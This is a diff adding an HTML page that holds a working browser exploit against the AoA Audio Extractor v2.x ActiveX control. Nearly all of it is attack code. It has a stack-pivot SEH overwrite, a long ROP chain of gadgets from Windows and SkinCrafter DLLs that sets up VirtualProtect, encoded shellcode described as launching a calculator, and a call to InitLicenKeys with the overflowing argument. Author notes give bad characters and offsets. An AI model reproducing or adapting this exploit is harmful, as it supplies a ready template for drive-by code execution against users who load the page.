@@ -1,0 +1,194 @@
+<html>
+
+<p>
+<center>AoA Audio Extractor v2.x ActiveX ROP exploit<br />
+Hadji Samir - s-dz<|AT|>hotmail.fr & mr_me - mr_me<|AT|>net-ninja.net<br /></center>
+</p>
+
+<!--
+some notes about the exploit:
+
+- Tested working on a fully patched windows XP sp3 IE8 VM
+  Last update was done on (Thursday, October 07, 2010)
+- Bad chars are: \x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e
+		 \x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
+- Offset to SEH is 2044 bytes in length
+- Warning, this exploit uses some static addresses from windows libraries and **may**
+  not be reliable. It was tested reliably under my VM though.
+- Modules used do not have aslr enabled on XPsp3
+- VirtualProtect() had a bad char in it! (\x80) so we leak a ptr off the stack and calc offset
+- Not marked safe for scripting, but oh well :)
+- Built with love!
+
+shoutz to jduck for helping me with the msf module :-)
+-->
+
+<object classid='clsid:125C3F0B-1073-4783-9A7B-D33E54269CA5' id='target' ></object>
+<script language='vbscript'>
+
+' ROP magic begins here: Stack pivot
+seh = unescape("%72%2a%02%10")'   0x10022a72 ==> ADD ESP,604; RETN 4
+
+' VirtualProtect() placeholders ;)
+
+vp = "AAAA"
+vp = vp + "BBBB"
+vp = vp + "CCCC"
+vp = vp + "DDDD"
+vp = vp + "EEEE"
+vp = vp + "FFFF"
+
+' Just a calc :)
+shellcode = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%48%49") & _
+unescape("%49%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%68") & _
+unescape("%58%50%30%42%31%42%41%6b%41%41%78%32%41%42%32%42") & _
+unescape("%41%30%42%41%41%58%38%41%42%50%75%59%79%39%6c%4a") & _
+unescape("%48%50%44%63%30%35%50%43%30%4c%4b%57%35%77%4c%4c") & _
+unescape("%4b%51%6c%35%55%64%38%77%71%6a%4f%4c%4b%62%6f%45") & _
+unescape("%48%4e%6b%31%4f%45%70%55%51%6a%4b%73%79%6e%6b%70") & _
+unescape("%34%6c%4b%46%61%7a%4e%70%31%4b%70%4e%79%6e%4c%6c") & _
+unescape("%44%49%50%52%54%67%77%5a%61%59%5a%34%4d%55%51%6f") & _
+unescape("%32%4a%4b%79%64%37%4b%51%44%41%34%35%54%71%65%6d") & _
+unescape("%35%4e%6b%53%6f%47%54%65%51%4a%4b%31%76%4e%6b%46") & _
+unescape("%6c%30%4b%6e%6b%51%4f%75%4c%54%41%58%6b%4c%4b%77") & _
+unescape("%6c%6e%6b%66%61%58%6b%6d%59%33%6c%46%44%46%64%6a") & _
+unescape("%63%35%61%6b%70%71%74%6e%6b%63%70%54%70%6f%75%6f") & _
+unescape("%30%54%38%56%6c%4c%4b%61%50%36%6c%4e%6b%34%30%35") & _
+unescape("%4c%4c%6d%6e%6b%43%58%75%58%58%6b%54%49%4c%4b%4d") & _
+unescape("%50%6c%70%43%30%57%70%55%50%6e%6b%32%48%35%6c%71") & _
+unescape("%4f%67%41%6b%46%53%50%56%36%6b%39%48%78%4d%53%4f") & _
+unescape("%30%71%6b%32%70%33%58%4c%30%4d%5a%56%64%43%6f%52") & _
+unescape("%48%6a%38%4b%4e%4c%4a%66%6e%31%47%4b%4f%6b%57%61") & _
+unescape("%73%70%61%30%6c%71%73%64%6e%70%65%73%48%72%45%35") & _
+unescape("%50%68")
+
+
+vpSetupAndShellcode = String(308,"A") + vp + String(804,"A")+shellcode+String(8210, "A")
+
+' Our ROP payload, FML. Where do I begin?
+
+rop = String(264, "B")
+rop = rop + unescape("%c3%da%ab%71")'   0x71ABDAC3 ==> PUSH ESP; POP ESI; RETN			| ws2_32.dll
+rop = rop + unescape("%44%44%44%44")'   JUNK
+rop = rop + unescape("%f3%28%01%10")'   0x100128F3 ==> MOV EAX,ESI; POP ESI; RETN 4		| SkinCrafter.Dll		
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(8, unescape("%44"))' JUNK
+rop = rop + unescape("%01%36%ff%75")'   0x75FF3601 ==> MOV EAX,DWORD PTR DS:[EAX]; RETN		| MSVC60.dll
+rop = rop + unescape("%ff%40%ba%7c")'   0x7CBA40FF ==> XOR AH,AH; DEC ECX; RETN 0c		| SHELL32.dll
+rop = rop + unescape("%42%72%04%10")'   0x10047242 ==> XOR AL,AL; POP ESI; RETN 0c		| SkinCrafter.Dll
+rop = rop + String(16, unescape("%44"))' JUNK
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + String(12, unescape("%44"))' JUNK
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%f9%df%04%10")'   0x1004DFF9 ==> INC EAX; RETN				| SkinCrafter.Dll
+rop = rop + unescape("%f9%df%04%10")'   0x1004DFF9 ==> INC EAX; RETN				| SkinCrafter.Dll
+rop = rop + unescape("%f9%df%04%10")'   0x1004DFF9 ==> INC EAX; RETN				| SkinCrafter.Dll
+rop = rop + unescape("%f9%df%04%10")'   0x1004DFF9 ==> INC EAX; RETN				| SkinCrafter.Dll
+rop = rop + unescape("%bc%8f%c5%77")'   0x77C58FBC ==> XCHG EAX,EDX; RETN			| msvrt.dll
+rop = rop + unescape("%c3%da%ab%71")'   0x71ABDAC3 ==> PUSH ESP; POP ESI; RETN 			| ws2_32.dll	
+rop = rop + unescape("%f3%28%01%10")'   0x100128F3 ==> MOV EAX,ESI; POP ESI; RETN 4		| SkinCrafter.Dll	
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%ed%62%44%7e")'	0x7E4462ED ==> XCHG EAX,ECX; RETN			| USER32.dll
+rop = rop + unescape("%c3%da%ab%71")'   0x71ABDAC3 ==> PUSH ESP; POP ESI; RETN 			| ws2_32.dll
+rop = rop + unescape("%f3%28%01%10")'   0x100128F3 ==> MOV EAX,ESI; POP ESI; RETN 4		| ws2_32.dll
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%bf%2d%04%10")'   0x10042DBF ==> MOV DWORD PTR DS:[EAX],
+				    '		       EDX; MOV DWORD PTR DS:[EAX+4],ECX; RETN	| SkinCrafter.Dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%ed%62%44%7e")'	0x7E4462ED ==> XCHG EAX,ECX; RETN			| USER32.dll
+rop = rop + unescape("%bc%8f%c5%77")'   0x77C58FBC ==> XCHG EAX,EDX; RETN			| msvrt.dll
+rop = rop + unescape("%77%46%01%10")'	0x10014677 ==> XOR EAX,EAX; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%8f%c7%03%10")'   0x1003C78F ==> ADD EAX,354; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%ed%62%44%7e")'	0x7E4462ED ==> XCHG EAX,ECX; RETN			| USER32.dll
+rop = rop + unescape("%bf%2d%04%10")'   0x10042DBF ==> MOV DWORD PTR DS:[EAX],
+				    '		       EDX; MOV DWORD PTR DS:[EAX+4],ECX; RETN	| SkinCrafter.Dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + String(4, unescape("%44"))' JUNK
+rop = rop + unescape("%bc%8f%c5%77")'   0x77C58FBC ==> XCHG EAX,EDX; RETN			| msvrt.dll
+rop = rop + unescape("%77%46%01%10")'	0x10014677 ==> XOR EAX,EAX; RETN			| SkinCrafter.Dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%d6%65%02%10")'	0x100265D6 ==> POP ECX; RETN				| SkinCrafter.Dll
+rop = rop + unescape("%20%60%e9%01")'	0x01e96020 address from .data (writable)		| SkinCrafter.Dll
+rop = rop + unescape("%bc%8f%c5%77")'   0x77C58FBC ==> XCHG EAX,EDX; RETN			| msvrt.dll
+rop = rop + unescape("%bf%2d%04%10")'   0x10042DBF ==> MOV DWORD PTR DS:[EAX],
+				    '		       EDX; MOV DWORD PTR DS:[EAX+4],ECX; RETN	| SkinCrafter.Dll
+rop = rop + unescape("%b5%53%01%76")'   0x760153B5 ==> SUB EAX,20; POP EDI; POP EBX; RETN	| MSVC60.dll
+rop = rop + String(12, unescape("%44"))' JUNK
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%c1%f2%c1%77")'   0x77C1F2C1 ==> ADD EAX,8; RETN				| msvrt.dll
+rop = rop + unescape("%2d%2d%ff%75")'   0x75FF2D2D ==> XCHG EAX,ESP; RETN			| MSVC60.dll
+rop = rop + String(1244, "B")
+
+arg1="defaultV"
+arg2=rop+seh+vpSetupAndShellcode
+arg3="defaultV"
+arg4="defaultV"
+arg5="defaultV"
+
+target.InitLicenKeys arg1 ,arg2 ,arg3 ,arg4 ,arg5 
+</script>
+</html>
+ 		 	   		  
